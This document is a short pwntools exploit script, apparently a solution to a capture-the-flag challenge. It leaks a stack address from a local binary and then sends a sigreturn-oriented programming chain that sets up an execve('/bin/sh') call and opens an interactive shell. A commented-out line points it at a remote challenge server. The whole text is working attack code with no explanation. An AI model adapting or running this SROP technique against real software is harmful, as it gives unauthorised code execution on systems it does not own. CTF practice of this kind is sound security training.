from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=process("./pwn")
# io=remote(b"node3.anna.nssctf.cn",28623)

vuln=0x4004ed
syscall=0x400517
mov_rax_0xf=0x4004da

# gdb.attach(io)
# pause()

payload=p64(vuln)*3
io.send(payload)

stack_addr=u64(io.recv()[0x20:0x28])
print("stack_addr: ",hex(stack_addr))

str_bin_sh=stack_addr-0x118

sigframe=SigreturnFrame()
sigframe.rax=59
sigframe.rdi=str_bin_sh
sigframe.rsi=0
sigframe.rsp=stack_addr
sigframe.rdx=0
sigframe.rip=syscall

payload=b"/bin/sh\x00"+p64(0)+p64(mov_rax_0xf)+p64(syscall)+bytes(sigframe)
io.send(payload)

io.interactive()